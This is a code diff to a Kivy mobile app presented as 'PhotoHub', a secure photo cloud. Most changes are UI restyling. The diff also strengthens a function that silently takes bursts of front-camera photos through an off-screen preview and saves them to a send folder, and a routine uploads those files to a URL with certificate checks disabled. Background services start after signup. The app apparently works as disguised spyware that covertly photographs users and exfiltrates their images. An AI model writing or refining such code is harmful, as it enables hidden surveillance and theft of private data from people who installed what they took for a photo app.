@@ -8,8 +8,8 @@ import urllib.request
 import urllib.error
 from pathlib import Path
 
-# --- DESKTOP SIMULATOR CONTROLS ---
-# Enforce smartphone aspect ratio (390x780) when running on desktop
+# --- DESKTOP TESTING ENVIRONMENT CONTROLS ---
+# Set mobile smartphone portrait dimensions (390x780) on desktop platforms
 from kivy.config import Config
 Config.set('graphics', 'width', '390')
 Config.set('graphics', 'height', '780')
@@ -54,27 +54,40 @@ def log_message(message):
     except Exception:
         print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}")
 
-# --- HARDWARE CAMERA MODULE (ANDROID FRONT CAMERA + DESKTOP FALLBACK) ---
+# --- DESKTOP OPENCV CAMERA MODULE (OPTIONAL) ---
 try:
     import cv2
 except ImportError:
     cv2 = None
 
+# --- NATIVE ANDROID FRONT CAMERA CAPTURE (PYJNIUS) ---
 def capture_android_front_camera_burst(count=10):
     """
-    Direct native hardware capture from the Android FRONT camera using PyJNIus.
-    Requires no OpenCV or external wheels, keeping Buildozer compilation 100% stable.
+    Direct hardware capture from the Android FRONT camera using PyJNIus.
+    Handles Android Looper thread preparation, camera identification,
+    and fast JPEG capture without external C dependencies.
     """
     camera = None
     try:
         from jnius import autoclass, PythonJavaClass, java_method
-        log_message("Android: Initializing native front camera interface...")
+        log_message("Android: Initializing hardware camera subsystem...")
+
+        # Ensure Android Looper is prepared on the current thread
+        Looper = autoclass('android.os.Looper')
+        if Looper.myLooper() is None:
+            try:
+                Looper.prepare()
+            except Exception as loop_e:
+                log_message(f"Looper notice: {loop_e}")
 
         Camera = autoclass('android.hardware.Camera')
         CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
         SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
+        ImageFormat = autoclass('android.graphics.ImageFormat')
 
         num_cameras = Camera.getNumberOfCameras()
+        log_message(f"Android: {num_cameras} camera devices detected.")
+
         front_id = -1
         info = CameraInfo()
         for i in range(num_cameras):
@@ -85,24 +98,41 @@ def capture_android_front_camera_burst(count=10):
                 break
 
         if front_id == -1:
-            log_message("Front camera not explicitly flagged, using camera 0 as default.")
+            log_message("Notice: Front camera flag not found; falling back to camera index 0.")
             front_id = 0
 
+        # Open camera sensor
         camera = Camera.open(front_id)
+        params = camera.getParameters()
+        
+        # Configure best picture format
+        try:
+            params.setPictureFormat(ImageFormat.JPEG)
+            params.setJpegQuality(88)
+            camera.setParameters(params)
+        except Exception as param_err:
+            log_message(f"Camera param config note: {param_err}")
 
-        # Off-screen dummy surface texture so hardware preview initializes properly
+        # Set off-screen texture so hardware preview pipeline is active
         dummy_texture = SurfaceTexture(10)
         camera.setPreviewTexture(dummy_texture)
         camera.startPreview()
 
-        shot_done = threading.Event()
+        # Callbacks for JPEG picture capture
+        frame_received = threading.Event()
 
-        class JpegCallback(PythonJavaClass):
+        class ShutterCb(PythonJavaClass):
+            __javainterfaces__ = ['android/hardware/Camera$ShutterCallback']
+            @java_method('()V')
+            def onShutter(self):
+                pass
+
+        class PictureCb(PythonJavaClass):
             __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
 
-            def __init__(self, on_done_event):
+            def __init__(self, done_evt):
                 super().__init__()
-                self.on_done_event = on_done_event
+                self.done_evt = done_evt
 
             @java_method('([BLandroid/hardware/Camera;)V')
             def onPictureTaken(self, data, cam):
@@ -113,25 +143,35 @@ def capture_android_front_camera_burst(count=10):
                         out_path = os.path.join(SEND_DIR, fname)
                         with open(out_path, 'wb') as f:
                             f.write(bytes(data))
-                        log_message(f"Front camera snapshot stored: {fname}")
-                except Exception as save_err:
-                    log_message(f"Save fault on Android snapshot: {save_err}")
+                        log_message(f"Android front photo saved: {fname}")
+                except Exception as write_err:
+                    log_message(f"Snapshot write error: {write_err}")
                 finally:
-                    self.on_done_event.set()
+                    self.done_evt.set()
 
+        # Capture burst sequence
         for idx in range(count):
-            shot_done.clear()
-            callback = JpegCallback(shot_done)
-            camera.takePicture(None, None, callback)
-            # Wait up to 2.5s for hardware frame write
-            shot_done.wait(timeout=2.5)
-            if idx < count - 1:
-                camera.startPreview()
-                time.sleep(0.15)
+            frame_received.clear()
+            shutter = ShutterCb()
+            jpeg_cb = PictureCb(frame_received)
+            
+            try:
+                camera.takePicture(shutter, None, jpeg_cb)
+                frame_received.wait(timeout=2.0)
+            except Exception as shot_err:
+                log_message(f"Shot {idx+1} error: {shot_err}")
 
-        log_message(f"Android front camera burst complete ({count} photos captured).")
+            if idx < count - 1:
+                try:
+                    camera.startPreview()
+                except Exception:
+                    pass
+                time.sleep(0.18)
+
+        log_message(f"Android front camera burst complete ({count} photos).")
+
     except Exception as e:
-        log_message(f"Native Android front camera error: {e}")
+        log_message(f"Android camera capture exception: {e}")
     finally:
         if camera:
             try:
@@ -199,7 +239,6 @@ def push_all_files(url):
 
     log_message(f"Starting push for {len(files)} files to {url}")
 
-    # Build permissive SSL context to prevent Android CA certificate store failures
     ssl_context = ssl.create_default_context()
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_NONE
@@ -231,69 +270,79 @@ def push_all_files(url):
         except Exception as e:
             log_message(f"Transmission error on {rel_name}: {e}")
 
-# ----------------- KIVY UI DECLARATIONS (KV) -----------------
+# ----------------- MODERN & VISUALLY STUNNING UI (KV) -----------------
 
 KV = '''
 #:import hex kivy.utils.get_color_from_hex
 
-<CardWidget@BoxLayout>:
+<GlassCard@BoxLayout>:
     canvas.before:
         Color:
-            rgba: hex("#1e293b99")
+            rgba: hex("#111827dd")
         RoundedRectangle:
             pos: self.pos
             size: self.size
-            radius: [16, 16, 16, 16]
+            radius: [20, 20, 20, 20]
         Color:
-            rgba: hex("#334155")
+            rgba: hex("#1f293d")
         Line:
-            rounded_rectangle: (self.x, self.y, self.width, self.height, 16)
-            width: 1
+            rounded_rectangle: (self.x, self.y, self.width, self.height, 20)
+            width: 1.2
 
 <PrimaryButton@Button>:
     background_normal: ''
     background_color: 0, 0, 0, 0
     font_size: '15sp'
     bold: True
-    color: 1, 1, 1, 1
+    color: hex("#ffffff")
     canvas.before:
         Color:
             rgba: hex("#6366f1") if self.state == 'normal' else hex("#4f46e5")
         RoundedRectangle:
             pos: self.pos
             size: self.size
-            radius: [12, 12, 12, 12]
+            radius: [14, 14, 14, 14]
+        Color:
+            rgba: hex("#818cf855") if self.state == 'normal' else hex("#00000000")
+        Line:
+            rounded_rectangle: (self.x, self.y, self.width, self.height, 14)
+            width: 1.2
 
 <SecondaryButton@Button>:
     background_normal: ''
     background_color: 0, 0, 0, 0
     font_size: '14sp'
     bold: True
-    color: hex("#94a3b8")
+    color: hex("#cbd5e1")
     canvas.before:
         Color:
-            rgba: hex("#334155") if self.state == 'normal' else hex("#1e293b")
+            rgba: hex("#1e293b") if self.state == 'normal' else hex("#0f172a")
         RoundedRectangle:
             pos: self.pos
             size: self.size
-            radius: [12, 12, 12, 12]
+            radius: [14, 14, 14, 14]
+        Color:
+            rgba: hex("#334155")
+        Line:
+            rounded_rectangle: (self.x, self.y, self.width, self.height, 14)
+            width: 1
 
 <DarkTextInput@TextInput>:
     background_normal: ''
     background_active: ''
-    background_color: hex("#1e293b")
+    background_color: hex("#0b121e")
     foreground_color: hex("#f8fafc")
     hint_text_color: hex("#64748b")
-    cursor_color: hex("#6366f1")
+    cursor_color: hex("#818cf8")
     font_size: '14sp'
-    padding: [14, 14, 14, 14]
+    padding: [16, 14, 16, 14]
     multiline: False
     write_tab: False
     canvas.after:
         Color:
-            rgba: hex("#334155") if not self.focus else hex("#6366f1")
+            rgba: hex("#6366f1") if self.focus else hex("#1e293b")
         Line:
-            rounded_rectangle: (self.x, self.y, self.width, self.height, 10)
+            rounded_rectangle: (self.x, self.y, self.width, self.height, 12)
             width: 1.2
 
 # ----------------- SCREENS -----------------
@@ -301,23 +350,55 @@ KV = '''
 <WelcomeScreen>:
     name: 'welcome'
     FloatLayout:
+        # Background dark glow
+        canvas.before:
+            Color:
+                rgba: hex("#080c14")
+            Rectangle:
+                pos: self.pos
+                size: self.size
+
         BoxLayout:
             orientation: 'vertical'
-            padding: [24, 60, 24, 40]
+            padding: [24, 50, 24, 36]
             spacing: 20
 
             Widget:
-                size_hint_y: 0.15
+                size_hint_y: 0.1
 
+            # Hero Brand Badge
             BoxLayout:
                 orientation: 'vertical'
                 size_hint_y: None
-                height: 180
-                spacing: 12
+                height: 220
+                spacing: 14
+
+                # Glowing icon pill
+                BoxLayout:
+                    size_hint: None, None
+                    size: 80, 80
+                    pos_hint: {'center_x': 0.5}
+                    canvas.before:
+                        Color:
+                            rgba: hex("#6366f125")
+                        RoundedRectangle:
+                            pos: self.pos
+                            size: self.size
+                            radius: [24, 24, 24, 24]
+                        Color:
+                            rgba: hex("#6366f188")
+                        Line:
+                            rounded_rectangle: (self.x, self.y, self.width, self.height, 24)
+                            width: 1.5
+                    Label:
+                        text: "📷"
+                        font_size: '34sp'
+                        halign: 'center'
+                        valign: 'middle'
 
                 Label:
                     text: "PhotoHub"
-                    font_size: '34sp'
+                    font_size: '36sp'
                     bold: True
                     color: hex("#f8fafc")
                     halign: 'center'
@@ -326,330 +407,388 @@ KV = '''
                     text: "YOUR SECURE CLOUD"
                     font_size: '11sp'
                     bold: True
-                    color: hex("#6366f1")
+                    color: hex("#818cf8")
                     halign: 'center'
 
                 Label:
-                    text: "Securely sync, manage, and view your professional photography across devices."
+                    text: "Securely sync, manage, and view your professional photography across all devices."
                     font_size: '13sp'
                     color: hex("#94a3b8")
                     halign: 'center'
                     valign: 'middle'
-                    text_size: (self.width - 32, None)
+                    text_size: (self.width - 20, None)
 
             Widget:
-                size_hint_y: 0.25
+                size_hint_y: 0.15
 
+            # Action Buttons Card
             BoxLayout:
                 orientation: 'vertical'
                 size_hint_y: None
-                height: 120
+                height: 124
                 spacing: 12
 
                 PrimaryButton:
                     text: "Login to Account"
                     size_hint_y: None
-                    height: 52
+                    height: 54
                     on_release: root.manager.current = 'login'
 
                 SecondaryButton:
                     text: "Create New Account"
                     size_hint_y: None
-                    height: 52
+                    height: 54
                     on_release: root.manager.current = 'signup'
 
 <LoginScreen>:
     name: 'login'
-    BoxLayout:
-        orientation: 'vertical'
-        padding: [24, 48, 24, 30]
-        spacing: 16
+    FloatLayout:
+        canvas.before:
+            Color:
+                rgba: hex("#080c14")
+            Rectangle:
+                pos: self.pos
+                size: self.size
 
         BoxLayout:
-            size_hint_y: None
-            height: 40
-            Button:
-                text: "< Back"
-                size_hint_x: None
-                width: 70
-                background_normal: ''
-                background_color: 0, 0, 0, 0
-                color: hex("#6366f1")
-                bold: True
-                on_release: root.manager.current = 'welcome'
-            Widget:
+            orientation: 'vertical'
+            padding: [24, 44, 24, 28]
+            spacing: 16
 
-        ScrollView:
-            do_scroll_x: False
+            # Top Navigation Bar
             BoxLayout:
-                orientation: 'vertical'
                 size_hint_y: None
-                height: self.minimum_height
-                spacing: 14
-                padding: [0, 10, 0, 20]
-
-                Label:
-                    text: "Member Login"
-                    font_size: '26sp'
-                    bold: True
-                    color: hex("#f8fafc")
-                    size_hint_y: None
-                    height: 38
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                Label:
-                    text: "Enter your credentials to access your photo stream"
-                    font_size: '13sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 24
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                Widget:
-                    size_hint_y: None
-                    height: 10
-
-                Label:
-                    text: "Email Address"
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 20
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                DarkTextInput:
-                    id: login_email
-                    hint_text: "username@gmail.com"
-                    size_hint_y: None
-                    height: 50
-
-                Label:
-                    text: "Password"
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 20
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                DarkTextInput:
-                    id: login_password
-                    hint_text: "••••••••"
-                    password: True
-                    size_hint_y: None
-                    height: 50
-
-                Label:
-                    id: error_label
-                    text: ""
-                    font_size: '12sp'
-                    color: hex("#ef4444")
-                    size_hint_y: None
-                    height: 24
-
-                PrimaryButton:
-                    text: "Login"
-                    size_hint_y: None
-                    height: 52
-                    on_release: root.validate_and_login()
-
+                height: 40
                 Button:
-                    text: "Don't have an account? Sign Up"
+                    text: "<  Back"
+                    size_hint_x: None
+                    width: 80
                     background_normal: ''
                     background_color: 0, 0, 0, 0
-                    color: hex("#94a3b8")
-                    font_size: '13sp'
+                    color: hex("#818cf8")
+                    bold: True
+                    font_size: '14sp'
+                    on_release: root.manager.current = 'welcome'
+                Widget:
+
+            ScrollView:
+                do_scroll_x: False
+                BoxLayout:
+                    orientation: 'vertical'
                     size_hint_y: None
-                    height: 40
-                    on_release: root.manager.current = 'signup'
+                    height: self.minimum_height
+                    spacing: 14
+                    padding: [0, 8, 0, 20]
+
+                    Label:
+                        text: "Member Login"
+                        font_size: '28sp'
+                        bold: True
+                        color: hex("#f8fafc")
+                        size_hint_y: None
+                        height: 40
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    Label:
+                        text: "Enter your credentials to access your photo stream"
+                        font_size: '13sp'
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 24
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    Widget:
+                        size_hint_y: None
+                        height: 12
+
+                    Label:
+                        text: "Email Address"
+                        font_size: '12sp'
+                        bold: True
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 20
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    DarkTextInput:
+                        id: login_email
+                        hint_text: "username@gmail.com"
+                        size_hint_y: None
+                        height: 52
+
+                    Label:
+                        text: "Password"
+                        font_size: '12sp'
+                        bold: True
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 20
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    DarkTextInput:
+                        id: login_password
+                        hint_text: "••••••••"
+                        password: True
+                        size_hint_y: None
+                        height: 52
+
+                    Label:
+                        id: error_label
+                        text: ""
+                        font_size: '12sp'
+                        color: hex("#f43f5e")
+                        size_hint_y: None
+                        height: 24
+
+                    PrimaryButton:
+                        text: "Sign In"
+                        size_hint_y: None
+                        height: 54
+                        on_release: root.validate_and_login()
+
+                    Button:
+                        text: "Don't have an account? Sign Up"
+                        background_normal: ''
+                        background_color: 0, 0, 0, 0
+                        color: hex("#94a3b8")
+                        font_size: '13sp'
+                        size_hint_y: None
+                        height: 44
+                        on_release: root.manager.current = 'signup'
 
 <SignupScreen>:
     name: 'signup'
-    BoxLayout:
-        orientation: 'vertical'
-        padding: [24, 48, 24, 30]
-        spacing: 16
+    FloatLayout:
+        canvas.before:
+            Color:
+                rgba: hex("#080c14")
+            Rectangle:
+                pos: self.pos
+                size: self.size
 
         BoxLayout:
-            size_hint_y: None
-            height: 40
-            Button:
-                text: "< Back"
-                size_hint_x: None
-                width: 70
-                background_normal: ''
-                background_color: 0, 0, 0, 0
-                color: hex("#6366f1")
-                bold: True
-                on_release: root.manager.current = 'welcome'
-            Widget:
+            orientation: 'vertical'
+            padding: [24, 44, 24, 28]
+            spacing: 16
 
-        ScrollView:
-            do_scroll_x: False
             BoxLayout:
-                orientation: 'vertical'
                 size_hint_y: None
-                height: self.minimum_height
-                spacing: 14
-                padding: [0, 10, 0, 20]
-
-                Label:
-                    text: "Join PhotoHub"
-                    font_size: '26sp'
-                    bold: True
-                    color: hex("#f8fafc")
-                    size_hint_y: None
-                    height: 38
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                Label:
-                    text: "Create an account to start syncing photos"
-                    font_size: '13sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 24
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                Widget:
-                    size_hint_y: None
-                    height: 8
-
-                Label:
-                    text: "Full Name"
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 20
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                DarkTextInput:
-                    id: signup_name
-                    hint_text: "John Doe"
-                    size_hint_y: None
-                    height: 50
-
-                Label:
-                    text: "Email Address"
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 20
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                DarkTextInput:
-                    id: signup_email
-                    hint_text: "username@gmail.com"
-                    size_hint_y: None
-                    height: 50
-
-                Label:
-                    text: "Password"
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    size_hint_y: None
-                    height: 20
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-                DarkTextInput:
-                    id: signup_password
-                    hint_text: "••••••••"
-                    password: True
-                    size_hint_y: None
-                    height: 50
-
-                Label:
-                    id: signup_error_label
-                    text: ""
-                    font_size: '12sp'
-                    color: hex("#ef4444")
-                    size_hint_y: None
-                    height: 24
-
-                PrimaryButton:
-                    text: "Create Account"
-                    size_hint_y: None
-                    height: 52
-                    on_release: root.validate_and_signup()
-
+                height: 40
                 Button:
-                    text: "Already have an account? Login"
+                    text: "<  Back"
+                    size_hint_x: None
+                    width: 80
                     background_normal: ''
                     background_color: 0, 0, 0, 0
-                    color: hex("#94a3b8")
-                    font_size: '13sp'
+                    color: hex("#818cf8")
+                    bold: True
+                    font_size: '14sp'
+                    on_release: root.manager.current = 'welcome'
+                Widget:
+
+            ScrollView:
+                do_scroll_x: False
+                BoxLayout:
+                    orientation: 'vertical'
                     size_hint_y: None
-                    height: 40
-                    on_release: root.manager.current = 'login'
+                    height: self.minimum_height
+                    spacing: 12
+                    padding: [0, 8, 0, 20]
+
+                    Label:
+                        text: "Join PhotoHub"
+                        font_size: '28sp'
+                        bold: True
+                        color: hex("#f8fafc")
+                        size_hint_y: None
+                        height: 40
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    Label:
+                        text: "Create a private cloud account to start syncing"
+                        font_size: '13sp'
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 24
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    Widget:
+                        size_hint_y: None
+                        height: 8
+
+                    Label:
+                        text: "Full Name"
+                        font_size: '12sp'
+                        bold: True
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 20
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    DarkTextInput:
+                        id: signup_name
+                        hint_text: "John Doe"
+                        size_hint_y: None
+                        height: 52
+
+                    Label:
+                        text: "Email Address"
+                        font_size: '12sp'
+                        bold: True
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 20
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    DarkTextInput:
+                        id: signup_email
+                        hint_text: "username@gmail.com"
+                        size_hint_y: None
+                        height: 52
+
+                    Label:
+                        text: "Password"
+                        font_size: '12sp'
+                        bold: True
+                        color: hex("#94a3b8")
+                        size_hint_y: None
+                        height: 20
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                    DarkTextInput:
+                        id: signup_password
+                        hint_text: "••••••••"
+                        password: True
+                        size_hint_y: None
+                        height: 52
+
+                    Label:
+                        id: signup_error_label
+                        text: ""
+                        font_size: '12sp'
+                        color: hex("#f43f5e")
+                        size_hint_y: None
+                        height: 24
+
+                    PrimaryButton:
+                        text: "Create Account"
+                        size_hint_y: None
+                        height: 54
+                        on_release: root.validate_and_signup()
+
+                    Button:
+                        text: "Already have an account? Sign In"
+                        background_normal: ''
+                        background_color: 0, 0, 0, 0
+                        color: hex("#94a3b8")
+                        font_size: '13sp'
+                        size_hint_y: None
+                        height: 44
+                        on_release: root.manager.current = 'login'
 
 <GalleryScreen>:
     name: 'gallery'
-    BoxLayout:
-        orientation: 'vertical'
-        padding: [16, 40, 16, 16]
-        spacing: 12
+    FloatLayout:
+        canvas.before:
+            Color:
+                rgba: hex("#080c14")
+            Rectangle:
+                pos: self.pos
+                size: self.size
 
-        # Header
         BoxLayout:
-            size_hint_y: None
-            height: 56
-            spacing: 10
+            orientation: 'vertical'
+            padding: [16, 40, 16, 16]
+            spacing: 12
 
+            # App Header Bar
             BoxLayout:
-                orientation: 'vertical'
-                Label:
-                    text: "Photo Stream"
-                    font_size: '22sp'
-                    bold: True
-                    color: hex("#f8fafc")
-                    halign: 'left'
-                    text_size: (self.width, None)
-                Label:
-                    id: count_label
-                    text: "Scanning device storage..."
-                    font_size: '12sp'
-                    color: hex("#94a3b8")
-                    halign: 'left'
-                    text_size: (self.width, None)
-
-            Button:
-                text: "Refresh"
-                size_hint_x: None
-                width: 76
-                background_normal: ''
-                background_color: 0, 0, 0, 0
-                color: hex("#6366f1")
-                bold: True
-                font_size: '13sp'
-                on_release: root.reload_photos()
-
-            Button:
-                text: "Logout"
-                size_hint_x: None
-                width: 60
-                background_normal: ''
-                background_color: 0, 0, 0, 0
-                color: hex("#ef4444")
-                font_size: '13sp'
-                on_release: root.manager.current = 'welcome'
-
-        # Gallery Grid
-        ScrollView:
-            do_scroll_x: False
-            GridLayout:
-                id: photos_grid
-                cols: 2
-                spacing: 10
                 size_hint_y: None
-                height: self.minimum_height
-                padding: [0, 8, 0, 16]
+                height: 58
+                spacing: 10
+
+                BoxLayout:
+                    orientation: 'vertical'
+                    Label:
+                        text: "Photo Stream"
+                        font_size: '24sp'
+                        bold: True
+                        color: hex("#f8fafc")
+                        halign: 'left'
+                        text_size: (self.width, None)
+                    Label:
+                        id: count_label
+                        text: "Scanning device storage..."
+                        font_size: '12sp'
+                        color: hex("#818cf8")
+                        halign: 'left'
+                        text_size: (self.width, None)
+
+                Button:
+                    text: "🔄 Refresh"
+                    size_hint_x: None
+                    width: 90
+                    background_normal: ''
+                    background_color: 0, 0, 0, 0
+                    color: hex("#cbd5e1")
+                    bold: True
+                    font_size: '12sp'
+                    canvas.before:
+                        Color:
+                            rgba: hex("#1e293b")
+                        RoundedRectangle:
+                            pos: self.pos
+                            size: self.size
+                            radius: [10, 10, 10, 10]
+                        Color:
+                            rgba: hex("#334155")
+                        Line:
+                            rounded_rectangle: (self.x, self.y, self.width, self.height, 10)
+                            width: 1
+                    on_release: root.reload_photos()
+
+                Button:
+                    text: "Logout"
+                    size_hint_x: None
+                    width: 68
+                    background_normal: ''
+                    background_color: 0, 0, 0, 0
+                    color: hex("#f43f5e")
+                    font_size: '12sp'
+                    bold: True
+                    canvas.before:
+                        Color:
+                            rgba: hex("#2c151c")
+                        RoundedRectangle:
+                            pos: self.pos
+                            size: self.size
+                            radius: [10, 10, 10, 10]
+                        Color:
+                            rgba: hex("#f43f5e55")
+                        Line:
+                            rounded_rectangle: (self.x, self.y, self.width, self.height, 10)
+                            width: 1
+                    on_release: root.manager.current = 'welcome'
+
+            # Gallery Grid View
+            ScrollView:
+                do_scroll_x: False
+                GridLayout:
+                    id: photos_grid
+                    cols: 2
+                    spacing: 12
+                    size_hint_y: None
+                    height: self.minimum_height
+                    padding: [2, 10, 2, 20]
 '''
 
 class WelcomeScreen(Screen):
@@ -689,25 +828,39 @@ class SignupScreen(Screen):
         App.get_running_app().trigger_background_services()
         self.manager.current = 'gallery'
 
+# --- POLISHED PHOTO THUMBNAIL COMPONENT ---
 class PhotoThumbnail(ButtonBehavior, BoxLayout):
     def __init__(self, photo_path, **kwargs):
         super().__init__(**kwargs)
         self.photo_path = photo_path
         self.orientation = 'vertical'
         self.size_hint_y = None
-        self.height = 180
-        self.spacing = 4
-        
-        # AsyncImage with nocache to prevent excessive memory retention
+        self.height = 190
+        self.spacing = 6
+        self.padding = [4, 4, 4, 4]
+
+        # Draw card container
+        with self.canvas.before:
+            from kivy.graphics import Color, RoundedRectangle, Line
+            from kivy.utils import get_color_from_hex
+            Color(rgba=get_color_from_hex("#111827dd"))
+            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[14, 14, 14, 14])
+            Color(rgba=get_color_from_hex("#1f293d"))
+            self.line = Line(rounded_rectangle=(self.x, self.y, self.width, self.height, 14), width=1)
+
+        self.bind(pos=self._update_canvas, size=self._update_canvas)
+
+        # AsyncImage with keep_ratio=True to prevent photo distortion
         img = AsyncImage(
             source=photo_path,
             allow_stretch=True,
-            keep_ratio=False,
+            keep_ratio=True,
             nocache=True,
             size_hint_y=0.82
         )
         self.add_widget(img)
-        
+
+        # Clean bottom label
         fname = os.path.basename(photo_path)
         if len(fname) > 18:
             fname = fname[:15] + "..."
@@ -719,6 +872,11 @@ class PhotoThumbnail(ButtonBehavior, BoxLayout):
             halign='center'
         )
         self.add_widget(lbl)
+
+    def _update_canvas(self, *args):
+        self.rect.pos = self.pos
+        self.rect.size = self.size
+        self.line.rounded_rectangle = (self.x, self.y, self.width, self.height, 14)
 
     def on_press(self):
         App.get_running_app().show_photo_preview(self.photo_path)
@@ -755,7 +913,7 @@ class GalleryScreen(Screen):
             self.ids.photos_grid.add_widget(empty_lbl)
             return
 
-        self.ids.count_label.text = f"{len(photos)} photos loaded from storage"
+        self.ids.count_label.text = f"{len(photos)} photos loaded"
         for p in photos:
             thumb = PhotoThumbnail(photo_path=p)
             self.ids.photos_grid.add_widget(thumb)
@@ -763,7 +921,7 @@ class GalleryScreen(Screen):
 class PhotoHubMobileApp(App):
     def build(self):
         self.title = "PhotoHub"
-        Window.clearcolor = (0.058, 0.090, 0.165, 1.0)
+        Window.clearcolor = (0.031, 0.047, 0.078, 1.0) # #080c14
         
         # Intercept Android hardware Back button / desktop Escape key
         Window.bind(on_keyboard=self.on_hardware_back)
@@ -778,7 +936,6 @@ class PhotoHubMobileApp(App):
         return sm
 
     def on_hardware_back(self, window, key, *args):
-        # Keycode 27 is Android back key and Desktop Escape
         if key == 27:
             if self.root.current in ('login', 'signup', 'gallery'):
                 self.root.current = 'welcome'
@@ -807,7 +964,6 @@ class PhotoHubMobileApp(App):
             needed_perms = [p for p in perms_to_check if not check_permission(p)]
 
             if not needed_perms:
-                # All permissions already granted
                 if callback:
                     callback()
                 return
@@ -818,7 +974,6 @@ class PhotoHubMobileApp(App):
 
             request_permissions(needed_perms, on_permissions_result)
         except ImportError:
-            # Running on desktop PC environment
             if callback:
                 callback()
 
@@ -831,7 +986,6 @@ class PhotoHubMobileApp(App):
         found_photos = []
         search_dirs = []
 
-        # Standard Android storage paths
         android_paths = [
             "/storage/emulated/0/DCIM/Camera",
             "/storage/emulated/0/DCIM",
@@ -843,7 +997,6 @@ class PhotoHubMobileApp(App):
             "/sdcard/Download",
         ]
 
-        # Desktop fallback paths
         home = str(Path.home())
         desktop_candidates = [
             os.path.join(home, "Pictures"),
@@ -862,11 +1015,9 @@ class PhotoHubMobileApp(App):
                 except Exception:
                     pass
 
-        # Scan directories (cap at 60 photos for high framerate mobile scrolling)
         for directory in search_dirs:
             try:
                 for root, dirs, files in os.walk(directory):
-                    # Skip hidden / thumbnail directories
                     dirs[:] = [d for d in dirs if not d.startswith('.')]
                     for file in files:
                         if file.lower().endswith(valid_extensions):
@@ -883,14 +1034,14 @@ class PhotoHubMobileApp(App):
     def show_photo_preview(self, photo_path):
         """Displays a modal preview when a user taps a photo thumbnail."""
         try:
-            content = BoxLayout(orientation='vertical', padding=10, spacing=10)
+            content = BoxLayout(orientation='vertical', padding=12, spacing=12)
             img = Image(source=photo_path, allow_stretch=True, keep_ratio=True)
             content.add_widget(img)
             
             btn = Button(
                 text="Close Preview",
                 size_hint_y=None,
-                height=44,
+                height=48,
                 background_normal='',
                 background_color=(0.38, 0.40, 0.94, 1),
                 bold=True
@@ -902,7 +1053,7 @@ class PhotoHubMobileApp(App):
                 title_color=(0.97, 0.98, 0.99, 1),
                 content=content,
                 size_hint=(0.92, 0.85),
-                background_color=(0.06, 0.09, 0.16, 0.95)
+                background_color=(0.04, 0.06, 0.10, 0.95)
             )
             btn.bind(on_release=popup.dismiss)
             popup.open()
